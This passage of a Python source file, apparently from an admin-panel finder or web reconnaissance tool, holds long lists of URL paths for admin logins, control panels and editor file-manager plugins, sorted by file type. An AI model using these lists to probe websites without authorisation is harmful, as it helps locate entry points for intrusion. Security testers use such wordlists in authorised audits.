    '/editpostjobs',
    '/edit_postjobs',
    '/edit-postjobs',
    '/addpostjobs',
    '/add-postjobs',
    '/add_postjobs',
    '/jobs',
    '/editjob',
    '/edit_job',
    '/addjob',
    '/add_job',
    '/edit-job',
    '/add-job',
    '/editjobs',
    '/edit_jobs',
    '/addjobs',
    '/add_jobs',
    '/edit-jobs',
    '/add-jobs',
    '/slider',
    '/addslider',
    '/add_slider',
    '/add-slider',
    '/editslider',
    '/edit_slider',
    '/edit-slider',
    '/announcement',
    '/editannouncement',
    '/edit_announcement',
    '/edit-announcement',
    '/addannouncement',
    '/add_announcement',
    '/add-announcement',
    '/editannouncements',
    '/edit_announcements',
    '/edit-announcements',
    '/addannouncements',
    '/add_announcements',
    '/add-announcements',
    '/posts',
    '/addpost',
    '/add_post',
    '/add-post',
    '/editpost',
    '/edit_post',
    '/edit-post',
    '/addposts',
    '/add_posts',
    '/add-posts',
    '/editposts',
    '/edit_posts',
    '/edit-posts',
    '/players',
    '/addplayer',
    '/add_player',
    '/add-player',
    '/editplayer',
    '/edit_player',
    '/edit-player',
    '/addplayers',
    '/add_players',
    '/add-players',
    '/editplayers',
    '/edit_players',
    '/edit-players',
    '/development',
    '/manage',
    '/add_banner',
    '/addbanner',
    '/add-banner',
    '/edit_banner',
    '/editbanner',
    '/edit-banner',
    '/add_banners',
    '/addbanners',
    '/add-banners',
    '/edit_banners',
    '/editbanners',
    '/edit-banners',
    '/eventphotolist',
    '/calendaredit',
    '/sittings',
    '/gallery',
    '/addgallery',
    '/add_gallery',
    '/add_clients',
    '/addclients',
    '/add-clients',
    '/edit-clients',
    '/editclients',
    '/edit-clients',
    '/add_client',
    '/addclient',
    '/add-client',
    '/edit-client',
    '/editclient',
    '/edit-client',
    '/add-gallery',
    '/editgallery',
    '/edit_gallery',
    '/edit-gallery',
    '/invoice',
    '/index'
    ]
    php_urls_list=[
    '/login.php',
    '/admin/account.php',
    '/admin/index.php',
    '/admin/login.php',
    '/admin/admin.php',
    '/admin/home.php',
    '/admin/edit.php',
    '/admin/edit_news.php',
    '/admin/editnews.php',
    '/admin/add.php',
    '/admin/addnews.php',
    '/admin/add_news.php',
    '/admin/users.php',
    '/admin/sittings.php',
    '/admin_area/admin.php',
    '/admin_area/login.php',
    '/siteadmin/login.php',
    '/siteadmin/index.php',
    '/admin_area/index.php',
    '/bb-admin/index.php',
    '/bb-admin/login.php',
    '/bb-admin/admin.php',
    '/admin/home.php',
    '/admin/controlpanel.php',
    '/admin.php',
    '/admin/cp.php',
    '/cp.php',
    '/administrator/index.php',
    '/administrator/login.php',
    '/nsw/admin/login.php',
    '/webadmin/login.php',
    '/admin/admin_login.php',
    '/admin_login.php',
    '/administrator/account.php',
    '/administrator.php',
    '/pages/admin/admin-login.php',
    '/admin/admin-login.php',
    '/admin-login.php',
    '/acceso.php',
    '/modelsearch/login.php',
    '/moderator.php',
    '/moderator/login.php',
    '/moderator/admin.php',
    '/account.php',
    '/controlpanel.php',
    '/admincontrol.php',
    '/rcjakar/admin/login.php',
    '/webadmin.php',
    '/webadmin/index.php',
    '/webadmin/admin.php',
    '/adminpanel.php',
    '/user.php',
    '/panel-administracion/login.php',
    '/wp-login.php',
    '/adminLogin.php',
    '/admin/adminLogin.php',
    '/admin/home.php',
    '/adminarea/index.php',
    '/adminarea/admin.php',
    '/adminarea/login.php',
    '/panel-administracion/index.php',
    '/panel-administracion/admin.php',
    '/modelsearch/index.php',
    '/modelsearch/admin.php',
    '/admincontrol/login.php',
    '/adm/admloginuser.php',
    '/admloginuser.php',
    '/admin2.php',
    '/admin2/login.php',
    '/admin2/index.php',
    '/usuarios/login.php',
    '/adm/index.php',
    '/adm.php',
    '/affiliate.php',
    '/adm_auth.php',
    '/memberadmin.php',
    '/administratorlogin.php',
    '/cpanel.php',
    '/access.php',
    '/admin1.php',
    '/admin/add_banner.php',
    '/admin/addblog.php',
    '/admin/add_gallery_image.php',
    '/admin/add.php',
    '/admin/add-room.php',
    '/admin/add-slider.php',
    '/admin/add_testimonials.php',
    '/admin/adminarea.php',
    '/admin/AdminDashboard.php',
    '/admin/admin-home.php',
    '/admin/AdminHome.php',
    '/admin/admin_index.php',
    '/admin/admin_management.php',
    '/admin/admin_users.php',
    '/admin/adminview.php',
    '/admin/adm.php',
    '/admin/banner.php',
    '/admin/banners_report.php',
    '/admin/category.php',
    '/admin/change_gallery.php',
    '/admin/checklogin.php',
    '/admin/configration.php',
    '/admin/control_pages/admin_home.php',
    '/admincontrol.php',
    '/admin/cpanel.php',
    '/admin/CPhome.php',
    '/admin/dashboard/index.php',
    '/admin/dashboard.php',
    '/admin/dashbord.php',
    '/admin/dash.php',
    '/admin/default.php',
    '/admin/enter.php',
    '/admin/event.php',
    '/admin/form.php',
    '/admin/gallery.php',
    '/admin/headline.php',
    '/admin_home.php',
    '/admin/index-digital.php',
    '/admin/index_ref.php',
    '/admin/initialadmin.php',
    '/administr8.php',
    '/administracion.php',
    '/administration.php',
    '/admin/leads.php',
    '/admin/list_gallery.php',
    '/admin/login-home.php',
    '/admin_login.php',
    '/admin-login.php',
    '/ADMIN/login.php',
    '/admin/login_success.php',
    '/admin/loginsuccess.php',
    '/admin/log.php',
    '/admin/main_page.php',
    '/admin/main.php',
    '/admin/ManageAdmin.php',
    '/admin/manageImages.php',
    '/admin/manage_team.php',
    '/admin/member_home.php',
    '/admin/moderator.php',
    '/admin/my_account.php',
    '/admin/myaccount.php',
    '/admin/overview.php',
    '/admin/page_management.php',
    '/admin/pages/home_admin.php',
    '/admin/product.php',
    '/admin/products.php',
    '/admin/save.php',
    '/admin/slider.php',
    '/admin/specializations.php',
    '/admins.php',
    '/admin/upload.php',
    '/admin/userpage.php',
    '/admin/viewblog.php',
    '/admin/viewmembers.php',
    '/admin/voucher.php',
    '/admin/welcomepage.php',
    '/admin/welcome.php',
    '/authorize.php',
    '/ccms/index.php',
    '/ccms/login.php',
    '/cms/_admin/logon.php',
    '/db/admin.php',
    '/admin/edit.php',
    '/fileadmin.php',
    '/include/admin.php',
    '/includes/login.php',
    '/interactive/admin.php',
    '/links/login.php',
    '/login/login.php',
    '/manage_admin.php',
    '/moderator.php',
    '/panel.php',
    '/Server.php',
    '/site_admin/login.php',
    '/sysadmin.php',
    '/ur-admin.php'
    ]
    aspx_urls_list=[
    '/login.aspx',
    '/admin/account.aspx',
    '/admin/index.aspx',
    '/admin/login.aspx',
    '/admin/admin.aspx',
    '/admin_area/admin.aspx',
    '/admin_area/login.aspx',
    '/siteadmin/login.aspx',
    '/siteadmin/index.aspx',
    '/admin_area/index.aspx',
    '/bb-admin/index.aspx',
    '/bb-admin/login.aspx',
    '/bb-admin/admin.aspx',
    '/admin/home.aspx',
    '/admin/controlpanel.aspx',
    '/admin.aspx',
    '/admin/cp.aspx',
    '/cp.aspx',
    '/administrator/index.aspx',
    '/administrator/login.aspx',
    '/nsw/admin/login.aspx',
    '/webadmin/login.aspx',
    '/admin/admin_login.aspx',
    '/admin_login.aspx',
    '/administrator/account.aspx',
    '/administrator.aspx',
    '/pages/admin/admin-login.aspx',
    '/admin/admin-login.aspx',
    '/admin-login.aspx',
    '/modelsearch/login.aspx',
    '/moderator.aspx',
    '/moderator/login.aspx',
    '/moderator/admin.aspx',
    '/acceso.aspx',
    '/account.aspx',
    '/controlpanel.aspx',
    '/admincontrol.aspx',
    '/rcjakar/admin/login.aspx',
    '/webadmin.aspx',
    '/webadmin/index.aspx',
    '/webadmin/admin.aspx',
    '/adminpanel.aspx',
    '/user.aspx',
    '/panel-administracion/login.aspx',
    '/wp-login.aspx',
    '/adminLogin.aspx',
    '/admin/adminLogin.aspx',
    '/admin/home.aspx',
    '/adminarea/index.aspx',
    '/adminarea/admin.aspx',
    '/adminarea/login.aspx',
    '/panel-administracion/index.aspx',
    '/panel-administracion/admin.aspx',
    '/modelsearch/index.aspx',
    '/modelsearch/admin.aspx',
    '/admincontrol/login.aspx',
    '/adm/admloginuser.aspx',
    '/admloginuser.aspx',
    '/admin2.aspx',
    '/admin2/login.aspx',
    '/admin2/index.aspx',
    '/usuarios/login.aspx',
    '/adm/index.aspx',
    '/adm.aspx',
    '/affiliate.aspx',
    '/adm_auth.aspx',
    '/memberadmin.aspx',
    '/administratorlogin.aspx',
    '/login/admin.aspx',
    '/administartorlogin.aspx',
    '/login/administrator.aspx',
    '/a/dminlogin.aspx',
    '/adminhome.aspx',
    '/administrator_login.aspx'
    ]
    asp_urls_list=[
    '/account.asp',
    '/admin/account.asp',
    '/admin/index.asp',
    '/admin/login.asp',
    '/admin/admin.asp',
    '/admin_area/admin.asp',
    '/admin_area/login.asp',
    '/admin_area/index.asp',
    '/bb-admin/index.asp',
    '/bb-admin/login.asp',
    '/bb-admin/admin.asp',
    '/admin/home.asp',
    '/admin/controlpanel.asp',
    '/admin.asp',
    '/pages/admin/admin-login.asp',
    '/admin/admin-login.asp',
    '/admin-login.asp',
    '/admin/cp.asp',
    '/cp.asp',
    '/administrator/account.asp',
    '/administrator.asp',
    '/acceso.asp',
    '/login.asp',
    '/modelsearch/login.asp',
    '/moderator.asp',
    '/moderator/login.asp',
    '/administrator/login.asp',
    '/moderator/admin.asp',
    '/controlpanel.asp',
    '/user.asp',
    '/admincp/index.asp',
    '/admincp/login.asp',
    '/admincontrol.asp',
    '/adminpanel.asp',
    '/webadmin.asp',
    '/webadmin/index.asp',
    '/webadmin/admin.asp',
    '/webadmin/login.asp',
    '/admin/admin_login.asp',
    '/admin_login.asp',
    '/panel-administracion/login.asp',
    '/adminLogin.asp',
    '/admin/adminLogin.asp',
    '/admin/home.asp',
    '/adminarea/index.asp',
    '/adminarea/admin.asp',
    '/adminarea/login.asp',
    '/panel-administracion/index.asp',
    '/panel-administracion/admin.asp',
    '/modelsearch/index.asp',
    '/modelsearch/admin.asp',
    '/administrator/index.asp',
    '/admincontrol/login.asp',
    '/adm/admloginuser.asp',
    '/admloginuser.asp',
    '/admin2.asp',
    '/admin2/login.asp',
    '/admin2/index.asp',
    '/adm/index.asp',
    '/adm.asp',
    '/affiliate.asp',
    '/adm_auth.asp',
    '/memberadmin.asp',
    '/administratorlogin.asp',
    '/siteadmin/login.asp',
    '/siteadmin/index.asp',
    '/login/admin.asp',
    '/login/asmindstrator.asp',
    '/adminlogin.asp',
    '/adminhome.asp',
    '/administrator_login.asp',
    '/admin1.asp',
    '/administr8.asp',
    '/admins.asp',
    '/fileadmin.asp',
    '/Server.asp',
    '/sysadmin.asp',
    '/ur-admin.asp'
    ]
    html_urls_list=[
    '/admin/account.html',
    '/admin/index.html',
    '/admin/login.html',
    '/admin/admin.html',
    '/admin_area/admin.html',
    '/admin_area/login.html',
    '/admin_area/index.html',
    '/bb-admin/index.html',
    '/bb-admin/login.html',
    '/bb-admin/admin.html',
    '/admin/home.html',
    '/admin/controlpanel.html',
    '/admin.html',
    '/admin/cp.html',
    '/cp.html',
    '/administrator/index.html',
    '/administrator/login.html',
    '/administrator/account.html',
    '/administrator.html',
    '/login.html',
    '/modelsearch/login.html',
    '/moderator.html',
    '/moderator/login.html',
    '/moderator/admin.html',
    '/account.html',
    '/controlpanel.html',
    '/admincontrol.html',
    '/admin_login.html',
    '/panel-administracion/login.html',
    '/adminpanel.html',
    '/webadmin.html',
    '/pages/admin/admin-login.html',
    '/admin/admin-login.html',
    '/webadmin/index.html',
    '/webadmin/admin.html',
    '/webadmin/login.html',
    '/user.html',
    '/admincp/index.html',
    '/admin/adminLogin.html',
    '/adminLogin.html',
    '/admin/home.html',
    '/adminarea/index.html',
    '/adminarea/admin.html',
    '/adminarea/login.html',
    '/panel-administracion/index.html',
    '/panel-administracion/admin.html',
    '/modelsearch/index.html',
    '/modelsearch/admin.html',
    '/admin/admin_login.html',
    '/admincontrol/login.html',
    '/adm/index.html',
    '/adm.html',
    '/admin-login.html',
    '/siteadmin/login.html',
    '/cpanel.html',
    '/admin_panel.html',
    '/admin1.html',
    '/admin2.html',
    '/administr8.html',
    '/administration.html',
    '/ADMIN/login.html',
    '/admin_main.html',
    '/admins.html',
    '/admin/uhome.html',
    '/fileadmin.html',
    '/Server.html',
    '/sysadmin.html',
    '/ur-admin.html'
    ]
    js_urls_list=[
    '/admin/account.js',
    '/admin/index.js',
    '/admin/login.js',
    '/admin/admin.js',
    '/admin_area/admin.js',
    '/admin_area/login.js',
    '/siteadmin/login.js',
    '/siteadmin/index.js',
    '/admin_area/index.js',
    '/bb-admin/index.js',
    '/bb-admin/login.js',
    '/bb-admin/admin.js',
    '/admin/home.js',
    '/admin/controlpanel.js',
    '/admin.js',
    '/admin/cp.js',
    '/cp.js',
    '/administrator/index.js',
    '/administrator/login.js',
    '/nsw/admin/login.js',
    '/webadmin/login.js',
    '/admin/admin_login.js',
    '/admin_login.js',
    '/administrator/account.js',
    '/administrator.js',
    '/pages/admin/admin-login.js',
    '/admin/admin-login.js',
    '/admin-login.js',
    '/login.js',
    '/modelsearch/login.js',
    '/moderator.js',
    '/moderator/login.js',
    '/moderator/admin.js',
    '/account.js',
    '/controlpanel.js',
    '/admincontrol.js',
    '/rcjakar/admin/login.js',
    '/webadmin.js',
    '/webadmin/index.js',
    '/acceso.js',
    '/webadmin/admin.js',
    '/adminpanel.js',
    '/user.js',
    '/panel-administracion/login.js',
    '/wp-login.js',
    '/adminLogin.js',
    '/admin/adminLogin.js',
    '/admin/home.js',
    '/adminarea/index.js',
    '/adminarea/admin.js',
    '/adminarea/login.js',
    '/panel-administracion/index.js',
    '/panel-administracion/admin.js',
    '/modelsearch/index.js',
    '/modelsearch/admin.js',
    '/admincontrol/login.js',
    '/adm/admloginuser.js',
    '/admloginuser.js',
    '/admin2.js',
    '/admin2/login.js',
    '/admin2/index.js',
    '/usuarios/login.js',
    '/adm/index.js',
    '/adm.js',
    '/affiliate.js',
    '/adm_auth.js',
    '/memberadmin.js',
    '/administratorlogin.js'
    ]
    slash_urls_list=[
    '/admin/',
    '/administrator/',
    '/administration/',
    '/admin1/',
    '/admin2/',
    '/admin3/',
    '/admin4/',
    '/admin5/',
    '/moderator/',
    '/webadmin/',
    '/adminarea/',
    '/bb-admin/',
    '/adminLogin/',
    '/admin_area/',
    '/panel-administracion/',
    '/instadmin/',
    '/memberadmin/',
    '/administratorlogin/',
    '/adm/',
    '/usuarios/',
    '/usuario/',
    '/admin_panel/',
    '/adm_cp/',
    '/access/',
    '/account/',
    '/acct_login/',
    '/_adm_/',
    '/_adm/',
    '/adm2/',
    '/_admin_/',
    '/_admin/',
    '/Admin/',
    '/ADMIN/',
    '/admin2/index/',
    '/admin4_account/',
    '/admin4_colon/',
    '/admin/add_banner.php/',
    '/admin/admin/',
    '/admincontrol.php/',
    '/administer/',
    '/administr8/',
    '/administrador/',
    '/administratie/',
    '/_administrator_/',
    '/_administrator/',
    '/administratoraccounts/',
    '/administrators/',
    '/administrivia/',
    '/admin-login.php/',
    '/admin/main.php/',
    '/adminpanel/',
    '/Admin/private/',
    '/adminpro/',
    '/admins/',
    '/admin_tool/',
    '/AdminTools/',
    '/AdminWeb/',
    '/admon/',
    '/ADMON/',
    '/auth/',
    '/auth/login/',
    '/autologin/',
    '/banneradmin/',
    '/base/admin/',
    '/bbadmin/',
    '/bigadmin/',
    '/blogindex/',
    '/cadmins/',
    '/ccms/',
    '/ccp14admin/',
    '/cms/',
    '/cms/admin/',
    '/cmsadmin/',
    '/cms/login/',
    '/configuration/',
    '/configure/',
    '/controlpanel/',
    '/cpanel/',
    '/cPanel/',
    '/cpanel_file/',
    '/customer_login/',
    '/database_administration/',
    '/Database_Administration/',
    '/directadmin/',
    '/dir-login/',
    '/editor/',
    '/evmsadmin/',
    '/ezsqliteadmin/',
    '/fileadmin/',
    '/formslogin/',
    '/globes_admin/',
    '/hpwebjetadmin/',
    '/Indy_admin/',
    '/irc-macadmin/',
    '/LiveUser_Admin/',
    '/login/',
    '/login1/',
    '/login_db/',
    '/loginflat/',
    '/login-redirect/',
    '/logins/',
    '/login-us/',
    '/logon/',
    '/logo_sysadmin/',
    '/Lotus_Domino_Admin/',
    '/macadmin/',
    '/mag/admin/',
    '/maintenance/',
    '/manager/',
    '/manager/ispmgr/',
    '/manuallogin/',
    '/members/',
    '/memlogin/',
    '/meta_login/',
    '/moderator.php/',
    '/myadmin/',
    '/navSiteAdmin/',
    '/newsadmin/',
    '/openvpnadmin/',
    '/panel/',
    '/panelc/',
    '/paneldecontrol/',
    '/pgadmin/',
    '/phpldapadmin/',
    '/phpmyadmin/',
    '/phppgadmin/',
    '/phpSQLiteAdmin/',
    '/platz_login/',
    '/pma/',
    '/power_user/',
    '/project-admins/',
    '/pureadmin/',
    '/radmind/',
    '/radmind-1/',
    '/rcLogin/',
    '/server/',
    '/Server/',
    '/ServerAdministrator/',
    '/server_admin_small/',
    '/showlogin/',
    '/simpleLogin/',
    '/site/admin/',
    '/siteadmin/',
    '/smblogin/',
    '/sql-admin/',
    '/sshadmin/',
    '/ss_vms_admin_sm/',
    '/staradmin/',
    '/sub-login/',
    '/Super-Admin/',
    '/support_login/',
    '/sys-admin/',
    '/sysadmin/',
    '/SysAdmin/',
    '/SysAdmin2/',
    '/sysadmins/',
    '/system_administration/',
    '/system-administration/',
    '/typo3/',
    '/ur-admin/',
    '/useradmin/',
    '/UserLogin/',
    '/usuarios//',
    '/utility_login/',
    '/vadmind/',
    '/vmailadmin/',
    '/WebAdmin/',
    '/webmaster/',
    '/websvn/',
    '/wizmysqladmin/',
    '/wp-admin/',
    '/wp-login/',
    '/wplogin/',
    '/xlogin/'
    ]
    cgi_urls_list=[
    '/bb-admin/index.cgi',
    '/bb-admin/login.cgi',
    '/bb-admin/admin.cgi',
    '/admin/home.cgi',
    '/admin/controlpanel.cgi',
    '/admin.cgi',
    '/admin/cp.cgi',
    '/cp.cgi',
    '/administrator/index.cgi',
    '/administrator/login.cgi',
    '/nsw/admin/login.cgi',
    '/webadmin/login.cgi',
    '/admin/admin_login.cgi',
    '/admin_login.cgi',
    '/administrator/account.cgi',
    '/administrator.cgi',
    '/pages/admin/admin-login.cgi',
    '/admin/admin-login.cgi',
    '/admin-login.cgi',
    '/login.cgi',
    '/modelsearch/login.cgi',
    '/moderator.cgi',
    '/moderator/login.cgi',
    '/moderator/admin.cgi',
    '/account.cgi',
    '/controlpanel.cgi',
    '/admincontrol.cgi',
    '/rcjakar/admin/login.cgi',
    '/webadmin.cgi',
    '/webadmin/index.cgi',
    '/acceso.cgi',
    '/webadmin/admin.cgi',
    '/adminpanel.cgi',
    '/user.cgi',
    '/panel-administracion/login.cgi',
    '/wp-login.cgi',
    '/adminLogin.cgi',
    '/admin/adminLogin.cgi',
    '/admin/home.cgi',
    '/adminarea/index.cgi',
    '/adminarea/admin.cgi',
    '/adminarea/login.cgi',
    '/panel-administracion/index.cgi',
    '/panel-administracion/admin.cgi',
    '/modelsearch/index.cgi',
    '/modelsearch/admin.cgi',
    '/admincontrol/login.cgi',
    '/adm/admloginuser.cgi',
    '/admloginuser.cgi',
    '/admin2.cgi',
    '/admin2/login.cgi',
    '/admin2/index.cgi',
    '/usuarios/login.cgi',
    '/adm/index.cgi',
    '/adm.cgi',
    '/affiliate.cgi',
    '/adm_auth.cgi',
    '/memberadmin.cgi',
    '/administratorlogin.cgi',
    '/admin/account.cgi',
    '/admin/index.cgi',
    '/admin/login.cgi',
    '/admin/admin.cgi',
    '/admin_area/admin.cgi',
    '/admin_area/login.cgi',
    '/siteadmin/login.cgi',
    '/siteadmin/index.cgi',
    '/admin_area/index.cgi'
    ]
    cfm_urls_list=[
    '/admin/account.cfm',
    '/admin/index.cfm',
    '/admin/login.cfm',
    '/admin/admin.cfm',
    '/admin_area/admin.cfm',
    '/admin_area/login.cfm',
    '/siteadmin/login.cfm',
    '/siteadmin/index.cfm',
    '/admin_area/index.cfm',
    '/bb-admin/index.cfm',
    '/bb-admin/login.cfm',
    '/bb-admin/admin.cfm',
    '/admin/home.cfm',
    '/admin/controlpanel.cfm',
    '/admin.cfm',
    '/login.cfm',
    '/modelsearch/login.cfm',
    '/moderator.cfm',
    '/moderator/login.cfm',
    '/rcjakar/admin/login.cfm',
    '/webadmin.cfm',
    '/webadmin/index.cfm',
    '/webadmin/admin.cfm',
    '/adminpanel.cfm',
    '/user.cfm',
    '/panel-administracion/login.cfm',
    '/wp-login.cfm',
    '/adminLogin.cfm',
    '/admin/adminLogin.cfm',
    '/admin/home.cfm',
    '/adminarea/index.cfm',
    '/adminarea/admin.cfm',
    '/adminarea/login.cfm',
    '/panel-administracion/index.cfm',
    '/panel-administracion/admin.cfm',
    '/modelsearch/index.cfm',
    '/modelsearch/admin.cfm',
    '/admincontrol/login.cfm',
    '/adm/admloginuser.cfm',
    '/admloginuser.cfm',
    '/admin2.cfm',
    '/admin2/login.cfm',
    '/admin2/index.cfm',
    '/usuarios/login.cfm',
    '/adm/index.cfm',
    '/adm.cfm',
    '/affiliate.cfm',
    '/adm_auth.cfm',
    '/memberadmin.cfm',
    '/administratorlogin.cfm',
    '/admin/cp.cfm',
    '/cp.cfm',
    '/administrator/index.cfm',
    '/administrator/login.cfm',
    '/nsw/admin/login.cfm',
    '/webadmin/login.cfm',
    '/admin/admin_login.cfm',
    '/admin_login.cfm',
    '/administrator/account.cfm',
    '/administrator.cfm',
    '/pages/admin/admin-login.cfm',
    '/admin/admin-login.cfm',
    '/admin-login.cfm',
    '/moderator/admin.cfm',
    '/account.cfm',
    '/controlpanel.cfm',
    '/admincontrol.cfm',
    '/acceso.cfm'
    ]
    brf_urls_list=[
    '/admin_area/admin.brf',
    '/admin_area/login.brf',
    '/siteadmin/login.brf',
    '/siteadmin/index.brf',
    '/admin_area/index.brf',
    '/bb-admin/index.brf',
    '/bb-admin/login.brf',
    '/bb-admin/admin.brf',
    '/admin/home.brf',
    '/admin/controlpanel.brf',
    '/admin.brf',
    '/admin/cp.brf',
    '/cp.brf',
    '/administrator/index.brf',
    '/administrator/login.brf',
    '/nsw/admin/login.brf',
    '/webadmin/login.brfbrf',
    '/admin/admin_login.brf',
    '/admin_login.brf',
    '/administrator/account.brf',
    '/administrator.brf',
    '/acceso.brf',
    '/pages/admin/admin-login.brf',
    '/admin/admin-login.brf',
    '/admin-login.brf',
    '/login.brf',
    '/modelsearch/login.brf',
    '/moderator.brf',
    '/moderator/login.brf',
    '/moderator/admin.brf',
    '/account.brf',
    '/controlpanel.brf',
    '/admincontrol.brf',
    '/rcjakar/admin/login.brf',
    '/webadmin.brf',
    '/webadmin/index.brf',
    '/webadmin/admin.brf',
    '/adminpanel.brf',
    '/user.brf',
    '/panel-administracion/login.brf',
    '/wp-login.brf',
    '/adminLogin.brf',
    '/admin/adminLogin.brf',
    '/admin/home.brf',
    '/adminarea/index.brf',
    '/adminarea/admin.brf',
    '/adminarea/login.brf',
    '/panel-administracion/index.brf',
    '/panel-administracion/admin.brf',
    '/modelsearch/index.brf',
    '/modelsearch/admin.brf',
    '/admincontrol/login.brf',
    '/adm/admloginuser.brf',
    '/admloginuser.brf',
    '/admin2.brf',
    '/admin2/login.brf',
    '/admin2/index.brf',
    '/usuarios/login.brf',
    '/adm/index.brf',
    '/adm.brf',
    '/affiliate.brf',
    '/adm_auth.brf',
    '/memberadmin.brf',
    '/administratorlogin.brf'
    ]
    manager_urls_list=[
    '/amministrazione/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/fckeditor/editor/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/resources/plugins/tiny_mce/plugins/filemanager/pages/fm/index.html',
    '/fileman/index.html',
    '/js/filemanager/dialog.php',
    '/js/filemanager/filemanager/dialog.php',
    '/static/filemanager/',
    '/public/scripts/tinymce_/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/static/filemanager/index.html',
    '/cms/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/tiny_mce_new/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/web/js/tinymce/plugins/filemanager/pages/fm/index.html',
    '/js/tinymce/plugins/filemanager/pages/fm/index.html',
    '/html/js/editor/ckeditor/editor/filemanager/browser/liferay/browser.html',
    '/js/editor/ckeditor/editor/filemanager/browser/liferay/browser.html',
    '/jscripts/tiny_mce/plugins/tinybrowser/tinybrowser.php',
    '/system/includes/tiny_mce/plugins/tinybrowser/tinybrowser.php',
    '/includes/tiny_mce/plugins/tinybrowser/tinybrowser.php',
    '/tiny_mce/plugins/tinybrowser/tinybrowser.php',
    '/design/js/tinymce/filemanager/browser.html',
    '/js/tinymce/filemanager/browser.html',
    '/design/js/tinymce/filemanager/frmupload.html',
    '/js/tinymce/filemanager/frmupload.html',
    '/modules/news/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/library/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager/ajaxfilemanager.php',
    '/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager/ajaxfilemanager.php',
    '/app/webroot/js/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/filemanager/index.html',
    '/web/FCKeditor/editor/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/FCKeditor/editor/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/WebManager/Filemanager/index.html',
    '/fckeditor/ajaxfilemanager/ajaxfilemanager.php',
    '/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/aspx/connector.aspx',
    '/tinymcpuk/filemanager/browser.html?Connector=connectors/php/connector.php',
    '/javascript/fckeditor/editor/filemanager/browser/default/browser.html',
    '/Common/javascript/fckeditor/editor/filemanager/browser/default/browser.html',
    '/tinym/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/tinymce_pt/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/js/tiny_mce/plugins/__tinybrowser/edit.php',
    '/admin/tinymce/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/lib/tinymce/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/tinymce/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/comuns/libs/tinymce_pt/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/libs/tinymce_pt/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/tinymce_pt/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/assets/backend/tinymce/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/assets/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/tinymce_new1/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/tinymce_new1/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/nmcms/tinymce3/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/tinymce3/jscripts/tiny_mce/plugins/tinybrowser/edit.php',
    '/Include_scripts/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/beta/js/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/addons/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/public/js/tiny_mce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/admin/FileManager/FileManager.php',
    '/admin/tiny_mce/plugins/tinybrowser/tinybrowser.php',
    '/library/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager/ajaxfilemanager.php',
    '/public/scripts/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/public/js/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/assets/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/assets/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/Scripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/public/manager/javascripts/tiny_mce/plugins/tinybrowser/tinybrowser.php',
    '/js/library/tiny_mce/plugins/tinybrowser/tinybrowser.php'
    '/jscripts/tiny_mce/plugins/tinybrowser/tinybrowser.php',
    '/user/js/jquery.tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/jquery.tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/lib/tinymce_3_3_9_2_dev/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/editor/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/js/admin/mgc/index.html',
    '/media/fckeditor/editor/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/fckeditor/editor/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/alumni/editor/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/editor/tiny_mce/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/app/webroot/plugins/ajaxfilemanager/ajaxfilemanager.php',
    '/Public/Js/kindeditor/plugins/file_manager/file_manager.html',
